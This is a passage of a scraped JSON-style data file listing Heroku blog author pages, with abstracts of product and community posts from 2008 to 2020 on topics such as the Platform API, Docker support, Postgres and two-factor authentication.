support of the fantastic Ruby community, Heroku is rapidly growing. We’re determined to keep improving our service for our ever expanding user base, and to that end we’re looking for a few fresh faces to join our world-class team in San Francisco . First up, we’re hiring our first full-time Heroku Evangelist . This lucky person should have a serious passion for Ruby and cloud computing, along with the enthusiasm and ability to communicate to our audience how Heroku can make their lives easier. There will be lots of presentations to make, conferences to visit, and ample room to engage our developer community – including open source projects. ... Read more Europe Here We Come news July 30, 2009 Morten Bagai Since the beginning of our private beta Heroku has been used by developers all over the world. Recently, we’ve been delighted to see a particularly strong interest from Rubyists in Europe looking to take advantage of the deployment and scalability benefits of our platform. On their trips to Erlang Factory in London and Kings of Code in Amsterdam, Blake and Orion saw immense interest from both individual hackers and established companies. In August I’ll be making the trip to several European Ruby user group meetings to catch up with even more users, and hopefully gain a better understanding of what they’d like to see from Heroku in the future. If you’re in or... Read more Build your live video apps with Justin.tv and Heroku news July 27, 2009 Morten Bagai You probably already know all about our friends and fellow Y Combinator alumni at Justin.tv . For the last couple of years, they’ve been driving an explosion of live video content on the web, streaming thousands of channels featuring events and people from all over the world. Today, things are about to get even more interesting as Justin.tv launches an extensive API that allows you to build your own live video apps using Justin.tv’s existing content and their technology platform. Whether you’re looking to enhance your own lifecasting project, or add video-based customer service to your company’s website, the Justin.tv API enables a whole new generation of exciting... Read more And the winner is... Michael Ansel! news July 13, 2009 Morten Bagai Congratulations to Michael who’s the winner of our Heroku+Twilio Developer contest . Michael got seriously busy, and submitted not one but two projects for the contest! The first is a handy app that tells students, faculty, employees, and visitors at Duke University which places on campus are currently open. Simply call in, and it’ll read you back a list of open restaurants, libraries etc. There’s even a keypad-based search option. Seriously cool stuff! You can try it on the Twilio sandbox by calling (866) 583-6913 and entering 4456-8772 when prompted for a PIN . If that wasn’t enough, Michael also hammered out a suite of Ruby development tools for Twilio, including... Read more Develop a Voice App with Twilio + Heroku, Win a Netbook news July 06, 2009 Morten Bagai Not too long ago building telephony apps, such as interactive voice response systems, was far out of reach for most web developers. Now, an exciting crop of new startups is rapidly changing that, making it easy to incorporate voice capabilities into any web app, or even build standalone voice apps. Twilio is emerging as one the leading companies in this area, offering a a REST API for building voice apps. The model is simple: sign up for a number with Twilio. When a call comes in, Twilio makes an HTTP request to URL of your choice, containing information about the phone call. The processing logic resides entirely inside your web app, and instructions are passed back and forth using ... Read more Railslab Interview news July 01, 2009 Morten Bagai Railslab is a great site by our friends over at New Relic that contains a wealth of knowledge on Rails scaling and application performance. A couple of weeks ago they asked Ryan and Adam to stop by for a discussion of the vision behind Heroku, and the philosophy that drives the design and buildout of our scalable, provisionless hosting platform . The interview is now available for your viewing pleasure in three parts. In the first part Adam goes into detail about the core vision behind the concept of instant deployment, and how Heroku is committed to making the deployment of Ruby web apps a seamless extension of an agile development workflow. In the second part Ryan and Adam discuss how... Read more Add-on: Wildcard Domains news May 27, 2009 Morten Bagai Since we returned from a fun and successful Railsconf in Vegas , we have been in full swing completing the rollout of our paid services. The response has been enormous so far, and paid services are now available to all users. If you’ve checked out the pricing page , you’ve undoubtedly noticed our line-up of a la carte add-ons . We’re really excited about add-ons becoming a key part of our platform, allowing us to seamlessly deliver popular application services and components with the built-in scalability and ease of use you’ve come to expect from Heroku. We’ve had a solid first batch of add-ons in beta for a while, and today we’re happy to announce the... Read more New Heroku Screencast by Remi news April 30, 2009 Morten Bagai It’s been a bit of a blur here at Heroku HQ in the past couple of weeks. However, amidst all the launch activity we did notice a screencast so sweet we thought we’d share it with you . It really covers the whole platform exceptionally well, and we particularly dig how it manages to show off both Rails and Rack app deployment. Big ups to Remi for putting this together, and way to shame us for not getting any official screencasts together for the new and improved Heroku. :) Read more Heroku at RailsConf news March 30, 2009 Morten Bagai Heroku is gearing up for RailsConf 09 in Las Vegas, and just like last year, we’ve got a sweet line-up for y’all… Kicking things off on Monday , Sinatra co-creator Blake Mizerany will be hosting an in-depth tutorial on the the micro-framework that’s sweeping the Ruby nation right now. Continuing in a similarly minimalistic vein on Wednesday , Adam Wiggins will lend his considerable Rack-fu to a talk showcasing Rails Metal – the hot new feature in Rails 2.3 that lets you build Rack endpoints for selected URLs that bypass Routes and ActionController for a massive speed boost. Heck, he’ll even show you how to use Sinatra inside your existing Rails app! ... Read more Radiant CMS in 5 Minutes Or Less news March 26, 2009 Morten Bagai Radiant is an excellent Rails-based Content Management System ( CMS ). It was created by John W. Long and Sean Cribbs, and has been around for a couple of years, growing steadily in popularity. With the recent addition of taps and gem manifests , it’s super-easy to get this lightweight CMS up and running on Heroku. Start by installing the latest radiant gem on your local box: $ sudo gem install radiant Now use the radiant command-line tool to set up your Radiant CMS locally. We’ll use SQLite as the local database: $ radiant --database sqlite mycms $ cd mycms $ rake db:bootstrap Before we can push to Heroku, we’ll need to initialize a git repo in our project directory: ... Read more Push and Pull Databases To and From Heroku news March 18, 2009 Morten Bagai Warning: This feature is deprecated; please use pg:pull instead. A frequent question people ask us is “how do I transfer my database between my local workstation and my Heroku app?” This is an important question for several reasons. First, you always own your data on Heroku, and we want you to be able to get to it quickly and easily at any time. Also – as you may have noticed from previous posts – we’re obsessive about workflow. Whether you’re debugging an issue with production data or setting up a staging environment, being able to quickly pull/push data between environments is key to a smooth experience. Previously, we offered yaml_db as a solution.... Read more Rails 2.3 news March 16, 2009 Morten Bagai The Rails 2.3.2 gem is now installed and available for use on Heroku. To learn more about what’s new and improved, check the official Rails blog post . Enjoy! Read more Gem Manifests news March 10, 2009 Morten Bagai Gem installation and management has always been pain when the time comes to deploy an app. Rails 2.1 made good progress in this area with gem dependency specifications , allowing you to vendor required gems with a of set rake commands. That’s the method we’ve been recommending for Heroku apps until now, but it does leave important problems unsolved. First, a substantial limitation of the vendoring method is that it only works with pure Ruby gems. Many apps depend on gems with native extensions that need to be compiled on the deployment target. It’s no good compiling a gem on your Mac laptop and trying to deploy the resulting binary to a Linux host. Then there’s the... Read more Build a news site with Rubyflow news February 10, 2009 Morten Bagai Ruby journalist extraordinaire, Peter Cooper, is a busy man. Chances are you’re already following his work to bring you the latest Ruby news on sites such as Ruby Inside and RubyFlow . Late last year he even added a tremendously useful site oriented towards iPhone and iPod Touch development called Mobile Orchard . Somewhere along the line he was also generous enough to leak the source code for Rubyflow, and now a version of that is available through Sutto’s Github repository .That’s great news for anyone looking to start their own news site, especially since it’s a breeze to get working on Heroku. Start by cloning the source from Github: $ git clone... Read more Heroku + Suspenders news January 12, 2009 Morten Bagai Making Rails readily accessible to developers of all stripes is a big part of the vision behind the Heroku platform, and we try to be supportive of any initiatives that make teaching and learning Rails easier. A couple of months ago, thoughtbot released suspenders – a freely available Rails template app, loaded with commonly used plugins, sensible configuration options and helpful rake tasks. Simple as it may seem, having a solid default app template is a really important step in eliminating the barriers that prevent developers from jumping directly from concept to coding with Rails. We think thoughtbot are doing the Rails community a real service with this project, so do yourself a... Read more Heroku at Rubyconf news November 04, 2008 Morten Bagai Rubyconf is upon us, and most of engineering team will be present in Orlando this week. If you’re attending, or maybe just nearby, this would be a great opportunity to say hi and/or ask those burning questions you’ve got about Heroku. Whether you’re wondering if Heroku will be a good fit for your needs, or have questions about a currently hosted app, we’re happy to make time for you. Just email us here and we’ll find a time/place to talk. Last but not least, don’t forget to catch Adam and Blake presenting on Lighweight Web Services with Sinatra and Restclient on Friday at 1:15pm. See you there! Read more", "date": "2011-08-31,"},
{"website": "Heroku", "title": null, "author": ["Michelle Greer", "Michelle Greer", "Michelle Greer"], "link": "https://blog.heroku.com/authors/michelle-greer", "abstract": "Introducing the Heroku Partner Directory news September 12, 2012 Michelle Greer In 2007, Los Angeles web development shop Bitscribe loved the productivity gains they found by developing using agile methodologies. What they didn’t like was the labor-intensive process necessary to deploy applications. Bitscribe principals James, Adam, and Orion decided to build a company just to solve this problem. They called it \"Heroku\", a combination of the words \"hero\" and \"haiku\". Hundreds of development shops from small shops like Bitscribe to large GSIs like Accenture now rely on Heroku so they can focus on building apps instead of deploying and running them. Many of these shops are now official partners. Their expertise ranges from web and mobile... Read more Java Hackathon news February 24, 2012 Michelle Greer This weekend, join us for a Java Hackathon at the Heroku office in San Francisco. We've decided to kick things off with a contest. To enter, build a creative and/or useful application that enables or manages interactions with customers or potential customers via social media channels. It can be any social media channel, and your app will be judged on how well it fits the contest criteria as well as the quality of your concept and implementation. The overall winner will receive a $500 Amazon gift card and a $500 Heroku credit. Two runners up will win a $100 Heroku credit. Here are the basic rules to enter: Your app has to be in Java or a Java framework. You don't have to be at the... Read more The Dodging Samurai Win the First Annual Octocat Dodgeball Invitational news October 24, 2011 Michelle Greer So our good friends at GitHub put together the First Annual Dodgeball Invitational with the intention of pummeling various Bay Area tech companies into submission. Heroku has never shied away from a challenge, especially when there is a giant Octocat trophy at stake. The Dodging Samurai emerged victorious despite facing a pool of 21 teams and one crotchety old man wielding a wrench. Through brute force, covert strategies and pink tutus , the Herokai were able to persevere through two teams from both GitHub and Engine Yard , a solid team from Code for America , as well a mysterious unnamed lucha libre fighter from Twilio . We commend both the spirit and the dodginess of all our competition... Read more", "date": "2012-09-12,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Facebook", "GitHub", "LinkedIn", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis", "Michael Friis"], "link": "https://blog.heroku.com/authors/michael-friis", "abstract": "Container and Runtime Performance Improvements news July 16, 2020 Michael Friis Today we’re sharing three performance enhancements that we have recently rolled out to apps running in Private Spaces: Dynos upgraded to the latest generation infrastructure for 10-15% perf improvement More consistent performance for Small Private and Shield Space dynos Optimized clock source selection Heroku is a fully managed platform-as-a-service (PaaS) and we work tirelessly to continuously improve and enhance the experience of running apps on our platform. Unlike lower-level infrastructure-as-a-service systems, improvements are applied automatically to apps and databases and require no action or intervention from app developers to benefit. That means that no action is required on... Read more VPN Support for Heroku Private Spaces news September 13, 2018 Michael Friis Today we're excited to announce Site-to-Site Virtual Private Network (VPN) support for Heroku Private Spaces . Heroku customers can now establish secure, site-to-site IPsec connections between Private Spaces on Heroku and their offices, datacenters and deployments on non-AWS clouds. VPN is a powerful, proven and widely-adopted technology for securely combining multiple networks (or adding individual hosts to a network) over encrypted links that span the public Internet. VPN is well-understood and in use by most enterprise IT departments, and is supported on all major cloud providers and by a range of hardware and software-based systems. Read more Internal Routing for Private Space Apps news September 13, 2018 Michael Friis Today we’re announcing a powerful new network control for apps running in Heroku Private Spaces : Internal Routing. Apps with Internal Routing work exactly the same as other Heroku apps, except the web process type is published to an endpoint that’s routable only within the Private Space and on VPC and VPN peered networks (see the Private Space VPN support companion post ). Apps with Internal Routing are impossible to access directly from the public internet, improving security and simplifying management and compliance checks for web sites, APIs and services that must not be publicly accessible. Read more Auto Cert Management and More TLS Options for Private Spaces news June 19, 2018 Michael Friis Today we’re announcing two exciting TLS improvements for apps running in Private Spaces —Heroku’s runtime optimized for security-sensitive workloads that require network and tenant isolation: Automated Certificate Management to automatically create, configure, and renew free TLS certificates for custom domains on Private Space apps Expanded and updated cipher suite selections for TLS/SSL termination for Private Space apps Together, ACM and greater TLS cipher suite flexibility makes building secure apps in Heroku Private Spaces simpler and less burdensome. Read on for details. Automated Certificate Management Automated Certificate Management (ACM) is now available at no extra cost for... Read more Docker support updates: Local data stores and more languages news August 18, 2015 Michael Friis Today we're releasing some exciting improvements to the Heroku beta Docker support announced 3 months ago : Automatic configuration of local containers running data stores (like Postgres, Redis and MongoDB) and support for many more languages including images for Node.js, Ruby, Go, Java, Scala, Clojure and Gradle. This helps you use local containers to run, test and deploy Heroku apps that have complex service dependencies with minimal setup and configuration. Heroku Docker support brings to your machine the Linux containerization technology that we have operated for many years. These local Docker containers make on-boarding, development and testing of apps simpler and faster, and with... Read more Heroku Button for Private Repos news June 11, 2015 Michael Friis Last year, we launched Heroku Button to make it simple for developers to deploy open source code to new Heroku apps. Open source contributors can add Heroku Buttons to GitHub READMEs, tutorials and blog posts and make their projects instantly deployable to Heroku, as apps fully provisioned with add-ons and other required configurations. Two months ago we introduced Elements where more than 1700 public Heroku Buttons are profiled alongside add-ons and top buildpacks. Today, we're happy to announce Heroku Buttons for projects maintained by your team in private GitHub repos. This new feature uses Heroku's GitHub integration to securely deploy code referenced by buttons on private... Read more Heroku Review Apps Beta news May 19, 2015 Michael Friis Today we’re announcing a feature that is going to change the way teams test and evaluate code changes. Continuous delivery works best when all team members — designers and testers included — can efficiently visualize and review the result of proposed changes. With Review Apps enabled, Heroku will spin up temporary test apps for every pull request that’s opened on GitHub, complete with fresh add-ons and other config required to make the app run. Instead of relying only on code reviews and unit tests run by CI, teams can use Review Apps to immediately try out and debug code branches in a production-like environment on Heroku. Review apps speed up team decision-making so that you can deliver... Read more Introducing 'heroku docker:release': Build & Deploy Heroku Apps with Docker news May 05, 2015 Michael Friis Important update We've recently made some big updates to our support for Docker and the feature described in this blog post has been deprecated. Learn more in the container registry and runtime dev center documentation. When Heroku launched the Cedar container stack 4 years ago, we became one of the first companies to use Linux Containers (LXC) to create a secure, performant and scalable cloud platform. Heroku has been a leader in the containerization movement, and we’ve spent years hardening, honing and evolving our runtime container stack. This means that developers can git push apps written in their favorite language and Heroku will build containers that are deployed to a... Read more Ship Code Faster: Announcing GitHub Integration GA news February 06, 2015 Michael Friis Today we’re announcing the general availability of GitHub integration for Heroku. When enabled, GitHub pushes are deployed immediately to linked Heroku apps. This is a big step forward for people working on apps with source managed on GitHub and deployed to Heroku. The integration has been in beta in Heroku Dashboard for a while, and we’ve seen great adoption and positive feedback. When a GitHub repo is connected to a Heroku app, you can either manually deploy branches from the repo, or you can configure a particular branch to auto-deploy to the app on every GitHub push. With auto-deploys enabled, you no longer have to maintain a separate heroku Git remote: Simply push to GitHub and... Read more Update Git clients on Windows and OS X news December 23, 2014 Michael Friis Last week, a security fix was released for Git . The fix patches a bug in the Git client that is exploitable on operating systems with case insensitive file systems such as Windows and OS X. Heroku has updated the Git installer that we ship with Toolbelt for Windows. We have also removed an old Git version from the OS X installer (it was not generally used). In addition, we’ve added a Git version warning in Toolbelt that will prompt you to update Git if you’re using a vulnerable version on Windows (shown here) or OS X: $ heroku apps WARNING: Your version of git is 1.9.3. Which has serious security vulnerabilities. More information here:... Read more HTTP Git now Generally Available news December 05, 2014 Michael Friis Today we’re happy to announce that the HTTP Git beta is over and that HTTP Git is fully ready for production. The beta was launched less than a month ago and we are already handling thousands of HTTP Git builds per day. In addition, HTTP Git powers the Dropbox Sync beta, making sure that Dropbox folders and Heroku repos are up-to-date. Over the past month, we have seen great adoption from partners, and Travis CI is using HTTP Git as the default git strategy for Heroku deployments. We encountered few issues during the beta, and we’re confident that HTTP Git is the best Git implementation for most Heroku users. For that reason, we’re making HTTP Git the default setup when repos are... Read more Announcing Beta Dropbox Sync news November 19, 2014 Michael Friis Helping teams to collaborate on creating, shipping and operating great apps is a core Heroku value. People collaborating on Heroku apps are not all alike: Some spend all day in the terminal, others prefer using Heroku from a browser. That’s why we’ve built both a powerful CLI and a great Dashboard . Today, we’re adding beta support for Dropbox Sync to complement Git-based deployments. By adding Dropbox as a way to sync changes, we’re making it easier for more users on diverse teams to contribute to apps built on Heroku. Git is a powerful tool for software developers to collaborate on building great apps and software. We added Git-based deployments 6 years ago , to plug Heroku straight into... Read more Announcing HTTP Git Beta news November 06, 2014 Michael Friis Of the many Platform-as-a-Service innovations Heroku has contributed in its seven year existence, perhaps the most iconic is git push heroku master . Today we’re announcing a significant upgrade to Heroku’s Git implementation: Beta support for Git’s HTTP transport. HTTP Git has some notable advantages over traditional SSH Git. Instead of relying on port 22 (often blocked by firewalls) HTTP Git runs on port 443, the same port used for secure web requests. Also, HTTP Git uses a simpler authentication model than SSH Git, and is easier to set up. Many new users struggle with the tooling and configuration required to configure git-push over SSH, especially on Windows. HTTP Git uses Heroku API... Read more Cedar-14 now Generally Available news November 04, 2014 Michael Friis We’re excited to announce that the Cedar-14 – the new version of the Celedon Cedar stack – is ready for general availability and is now the default stack on Heroku. Cedar-14 is based on the latest Ubuntu LTS Linux version and comes with a modern set of libraries and system dependencies that will stay current and updated for a long time to come. Since we announced the public beta of Cedar-14 three months ago, we have migrated most of the apps that we run on Heroku to Cedar-14 (yes, a lot of Heroku runs on the Heroku platform) and thousands of users have also moved apps or created new Cedar-14 apps. We have worked with these early adopters and with buildpack maintainers to weed out bugs and... Read more Try the new Uber API on Heroku news August 21, 2014 Michael Friis On Wednesday, Uber launched an API to let developers build new products and services that leverage the Uber ridesharing platform. Uber built a simple Python/Flask app that developers can use when exploring how the API works. This is the sort of experimentation and innovation that we at Heroku want to enable, so we sent a pull request to add an app.json file to the repo and a Heroku Button to the readme. To deploy the Uber sample on Heroku and experiment with the new Uber API, simply register on the Uber developer site and then click the button below: Once the app has been set up on Heroku, you’ll have to go back to the Uber developer site and configure the redirect URI to the URI for... Read more Cedar-14 Public Beta news August 19, 2014 Michael Friis At Heroku, we want to give our users access to the latest and greatest software stacks to base their apps on. That’s why we continuously update buildpacks to support new language and framework versions and let users experiment further using third-party buildpacks . Sitting underneath slugs and buildpacks are stacks . Stacks are the operating system and system libraries required to make apps run. Today we’re releasing into public beta a new version of the Celedon Cedar stack: cedar-14 . cedar-14 is built on the latest LTS version of Ubuntu Linux and has recent versions of libraries and system dependencies that will receive maintenance and security updates for a long time to come. Before... Read more Introducing Heroku Button news August 07, 2014 Michael Friis At Heroku, we want to make the process of deploying, running and updating code simple and easy. To that end, we’re launching the Heroku Button: a simple HTML or Markdown snippet that can be added to READMEs, blog posts and other places where code lives. Clicking a Heroku Button will take you through a guided process to configure and deploy an app running the source code referenced by the button. The best way to understand the Heroku Button is to try one. Click the example button below to deploy a Node.js sample project to an app running on your Heroku account: How it works When you see a Heroku Button in a README, in documentation or in a blog post, then this is a piece of code that’s... Read more Introducing programmatic builds on Heroku news May 21, 2014 Michael Friis Today, we are announcing an important addition to the Heroku Platform API : The /apps/:app/builds endpoint. This endpoint exposes the Heroku slug compilation process as a simple API primitive. You can use the endpoint to turn any publicly hosted source-tarball into a slug running on a Heroku app in seconds. Here’s output from a Go program that invokes the new endpoint: $ ./build -app limitless-fjord-5604 -archive https://github.com/heroku/node-js-sample/archive/master.tar.gz ......... -----> Node.js app detected -----> Requested node range: 0.10.x -----> Resolved node version: 0.10.28 -----> Downloading and installing node … $ curl http://limitless-fjord-5604.herokuapp.com/... Read more Heroku Platform API now GA news May 19, 2014 Michael Friis Today, we’re happy to announce General Availability of the Heroku Platform API. Heroku is a platform built by developers, for developers. As developers, we understand the utility of APIs and the power APIs give to speed up and script error-prone manual processes or to combine other services with Heroku into new and exciting products. With the Platform API, you now have a fully documented and supported way to instrument and automate Heroku. Designing and implementing this API has been an important process for Heroku internally: It has forced us rethink how different platform components are factored and how they should be exposed in a clean and coherent manner. We are already using the... Read more Two-factor Auth in Public Beta news May 06, 2014 Michael Friis Today, we’re excited to announce public beta of two-factor authentication for Heroku accounts. With two-factor auth enabled, an authentication code is required whenever you log in. The code is delivered using an app on your smartphone, and access to your phone becomes a required factor (in addition to your password) to access Heroku. An attacker that has somehow discovered your password will not be able to log in using just your password. Enabling two-factor auth The easiest way to enable two-factor auth is using Dashboard. Go to your account page , click the “Enable two-factor authentication” button and follow the on-screen instructions. Download an authenticator app for your... Read more JSON Schema for the Heroku Platform API news January 08, 2014 Michael Friis Today we’re making an important piece of Platform API tooling available: A machine-readable JSON schema that describes what resources are available via the API, what their URLs are, how they are represented and what operations they support. The schema opens up many interesting use cases, both for users and for us at Heroku working on improving and extending the API. A few examples are: Auto-creating client libraries for your favorite programming language Generating up-to-date reference docs Writing automatic acceptance and integration tests We are already using the schema to maintain the API reference documentation on Dev Center and to generate several v3 client libraries: Heroics for... Read more Programmatically release code to Heroku news December 20, 2013 Michael Friis Currently in beta, the Heroku Platform API lets developers automate, extend and combine the Heroku platform with other services in a programmatic, self-service way. Today we are setting the capstone into the API by adding slug and release endpoints to the API beta. These API endpoints are special. They expose a very core part of what Heroku does best: Quickly and safely releasing new versions of an app onto the Heroku platform. Using the new slug and release endpoints, platform developers can build integrations and services that completely sidestep the traditional Heroku Git deployment flow. So instead of requiring git push heroku master to deploy, it’s now possible to do things like: ... Read more OAuth for Platform API in Public Beta news July 22, 2013 Michael Friis In May, we launched the beta Heroku Platform API - making it possible to automate, extend and combine the Heroku platform with other services in a programmatic, self-service way. As of today, OAuth 2.0 support for the Platform API is available in public beta. With OAuth support, developers building integrations and services that use the Heroku API can provide a much better experience to their users. Instead of requesting full access to user accounts, access requests can be scoped to just the information and control a service needs. Instead of using one API key for all third-party services, users can check and revoke authorizations on a case-by-case basis. And users can manage all of... Read more Heroku Labs: Managing App Deployment with Pipelines news July 10, 2013 Michael Friis Editor's Note: The version of Pipelines described in this blog post has been deprecated and replaced by a new non-labs implementation . Features added through Heroku Labs are experimental and may change or be removed without notice. heroku fork lets you create unique, running instances of existing applications in a single command , making it fast and simple to set up homogenous development, staging and production environments. But have you ever wished you could deploy directly from staging to a production app after testing and validation? Heroku pipelines , now an experimental feature available in Heroku Labs, lets you define the relationship between apps and easily promote a slug from... Read more New Dyno Networking Model news May 02, 2013 Michael Friis Today we're announcing a change to how networking on Heroku works. Dynos now get a dedicated, virtual networking interface instead of sharing a network interface with other dynos. This makes dynos behave more like standard unix containers resulting in better compatibility with application frameworks and better parity between development and production environments . Background Previously, network interfaces were shared between multiple dynos. This weakened the abstraction of a dyno as a standard Unix-style container with a network interface of its own and full disposal of the whole TCP port range. The shared network interface also resulted in a low grade information leak where one... Read more", "date": "2020-07-16,"},
{"website": "Heroku", "title": null, "author": ["Email", "LinkedIn", "Meg Bednarcik"], "link": "https://blog.heroku.com/authors/meg-bednarcik", "abstract": "\"Do I Qualify?\" And Other Questions Imposters Must Ask Themselves life March 16, 2020 Meg Bednarcik A word of caution from a former AP Computer Science teacher who, with zero real-world programming experience, quit her dependable teaching gig to become a software engineer: Imposter Syndrome is never late to class. When we grow competent in our craft, yet continue to feel unqualified for our role, that feeling is known as \"Imposter Syndrome.\" The syndrome was with me before I started, it’s here with me now, and it will probably be with me for a long time to come. If you’ve experienced it too, then reading that last sentence may leave you feeling pessimistic, grim even — as if we anticipate a future where we never feel completely worthy of our position in life. But to that, I... Read more", "date": "2020-03-16,"},
{"website": "Heroku", "title": null, "author": ["Mattt Thompson", "Mattt Thompson", "Mattt Thompson", "Mattt Thompson"], "link": "https://blog.heroku.com/authors/mattt-thompson", "abstract": "Helios - open source framework for mobile news April 02, 2013 Mattt Thompson Heroku has a strong tradition with open source projects. Engineers have dedicated countless hours to the projects that developers count on every day. Open Source Software is in our DNA. Speaking personally, I’m passionate about building tools like AFNetworking and cupertino , in order to help developers build insanely great experiences for mobile devices. It’s with great pleasure that I introduce something new I’ve been working on: Helios is an open-source framework that provides essential back-end services for iOS apps. This includes data synchronization, push notifications, in-app purchases, and passbook integration. It allows developers to get a client-server app up-and-running while... Read more Postgres.app - easy development with Postgres on a Mac. news July 19, 2012 Mattt Thompson Postgres.app is the easiest way to get started developing with Postgres on the Mac. Open the app, and you have a local Postgres database ready and awaiting new connections. Close the app, and the server shuts down. It is available for free download today , and will be available on the Mac App Store pending Apple's approval. Postgres.app is designed so that most common programming libraries can find and it and link to it automatically - making it the easiest way to develop against Postgres on a Mac. It comes with the most popular Postgres libraries and extensions available right \"out of the box\" including: PostGIS 2.0 - Geospatial data and search. PLV8 - JavaScript... Read more A Very Good Day For Postgres: Postgres.app, Postgres Guide, and Schemaless SQL news April 24, 2012 Mattt Thompson Today has been a very good day for Postgres. We here at Heroku love Postgres, and we aren't afraid to show it. Here's how three different Herokai showed their PG love in three awesome ways in the last 24 hours: Postgres.app is the easiest way to run PostgreSQL on the Mac. Just open the app, and you have a server up and running with Postgres 9.1 and PostGIS 2.0. PostgreSQL has not been the easiest things to install--especially for new developers--so we see Postgres.app as an important step in making the world's best database more accessible to everyone. Postgres.app was created by Mattt Thompson , and launched in beta today. It will soon be available as a free download in the... Read more Nezumi 2.0 for Managing Heroku Apps 'on-the-go' Now Available for iPhone news February 21, 2012 Mattt Thompson Heroku users are known for leading jet-setter lifestyles. It's true! Developers with refined, sophisticated tastes git push to the cloud in order to appreciate the finer things of life: foreign cinema, travel to exotic destinations, and focusing on development instead of configuring system infrastructure. So it's only natural that Heroku developers on-the-go reach for Nezumi . Nezumi is a paid 3rd-party iPhone app created by Marshall Huss that allows you to scale dynos, restart apps, and so much more--perfect for when you're away from your computer. Its latest release adds support for Cedar applications, multiple accounts, a revamped console and log viewer, and a sleek, new... Read more", "date": "2013-04-02,"},
{"website": "Heroku", "title": null, "author": ["GitHub", "LinkedIn", "Matt Schaar"], "link": "https://blog.heroku.com/authors/matt-schaar", "abstract": "The 2017 Heroku Retrospective: Advancing Developer Experience, Data, and Trust news January 12, 2018 Matt Schaar 2017 was a great year for Heroku and our users. We want to thank each of you for your feedback, beta participation, and spirit of innovation, which inspires how we think about our products and evolve the platform. In the past year, we released a range of new features to make the developer experience even more elegant. We bolstered our existing lineup of data services while providing security controls for building high compliance applications on the platform. With that, we’d like to take a moment and share some of the highlights from 2017. We hope you enjoy it, and we look forward to an even more exciting 2018! Read more", "date": "2018-01-12,"},
{"website": "Heroku", "title": null, "author": ["Matt Manning"], "link": "https://blog.heroku.com/authors/matt-manning", "abstract": "Release of new database plans on August 1st news July 26, 2012 Matt Manning We are happy to announce that our new line-up of database plans are being released on August 1st. The dev , basic , crane , and kappa plans make many of the most exciting features of our fully-managed database service available to a wider audience. They are now ready for all users. We will also begin billing for these plans as of August 1st. If you have been beta testing one of these databases and do not wish to incur charges for it going forward, please remove it immediately via the web interface or the command line: heroku addons:remove HEROKU_POSTGRESQL_COLOR --app app_name If you have been waiting to use these plans because they have been in beta, then your wait is (almost) over. They... Read more", "date": "2012-07-26,"},
{"website": "Heroku", "title": null, "author": ["Matthew Manning", "Matthew Manning"], "link": "https://blog.heroku.com/authors/matthew-manning", "abstract": "Hacking Buildpacks news November 13, 2012 Matthew Manning Buildpacks are an extremely powerful tool for specifying the ecosystem of tools and dependencies packaged with your Heroku application and controlling the way the application is built from code to a deployed app. In the post announcing the release of buildpacks we illustrated this point, explaining how buildpacks provide the mechanism by which Heroku supports a variety of languages and frameworks, not just Ruby and Rails. We also briefly covered some of the end-user customizations that can be achieved with custom buildpacks, such as adding binary support and modifying the build process. Today we'll examine the basic structure of buildpacks and study some example customizations to... Read more Buildpacks: Heroku for Everything news July 17, 2012 Matthew Manning Last summer, Heroku became a polyglot platform , with official support for Ruby , Node.js , Clojure , Java , Python , and Scala . Building a platform that works equally well for such a wide variety of programming languages was a unique technical design challenge. siloed products would be a non-scalable design We knew from the outset that maintaining siloed, language-specific products – a Heroku for Ruby, a Heroku for Node.js, a Heroku for Clojure, and so on – wouldn't be scalable over the long-term. Instead, we created Cedar : a single, general-purpose stack with no native support for any language. Adding support for any language is a matter of layering on a build-time adapter that can... Read more", "date": "2012-11-13,"},
{"website": "Heroku", "title": "Product Improvements", "author": ["Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo", "Matthew Soldo"], "link": "https://blog.heroku.com/authors/matthew-soldo", "abstract": "The New Heroku Postgres Database Experience news August 12, 2014 Matthew Soldo Today Heroku is rolling out one of the most significant upgrades ever to our Postgres Database-as-a-Service. This new release is focused on a set of services that run on top of your Heroku Postgres database, making it easier to understand and operate, especially at scale. In addition, we are rolling out new production database plans with double the memory and 2-3 times the performance of our existing plans at the same cost to you. These features represent a new experience for our Postgres service, which we collectively call DbX, for database experience. The highlight of these new features is Performance Analytics, a set of analytics and visualization tools that allow you to understand... Read more Faster Database forking news June 12, 2014 Matthew Soldo Did you know that Heroku databases can be forked? Forking a database creates a byte-for-byte copy that can be used for testing and development. It is a useful tool that allows teams to be agile with their data. Today, forking databases is becoming faster. Fast forking reduces the time to create a fork by hours for high transaction database. To quickly fork a database, simply add the --fast flag: $ heroku addons:add heroku-postgresql:crane --fork BLUE --fast Fast forks behave differently from regular forks. They take less time to create, but the data will be somewhat out-of-date (as much as 30 hours). If your data has not changed significantly and you have not performed any schema... Read more HTTP Request IDs improve visibility across the application stack news February 28, 2014 Matthew Soldo Visibility into your application is necessary to properly analyze and troubleshoot issues as they arise. One of the key factors to good visibility is using logs as event streams and treating them as the canonical source of what happened on an app. The challenge with using logs is to correlate events across the stack consisting of your application's code and Heroku's platform components. Today, we are releasing new functionality that makes this simple. By using the emerging X-Request-ID convention, you can easily correlate multiple log entries to individual HTTP(s) requests. HTTP Request IDs are now enabled on all Heroku apps. Understanding X-Request-ID on Heroku Each HTTP... Read more Heroku XL: Focusing on Large Scale Apps news February 02, 2014 Matthew Soldo Having a web or mobile app become hugely popular is one of those \"good problems\" to have. But success is still its own challenge - making any architecture work at high volume can often create a unique kind of complexity. And as the Internet grows, and apps become more prevalent, its an increasingly common requirement. The largest app on Heroku routinely exceeds 10,000 requests / second, and two of the top 50 sites on the Internet (as measured by Quantcast ) - Urban Dictionary ( 45th largest ) and Upworthy ( 40th largest ) - run on Heroku. Across all apps, Heroku is now serving over 5 billion requests per day (or about 60,000 requests per second). Heroku has always been guided by the... Read more Powering the Internet of Customers with Heroku1 news 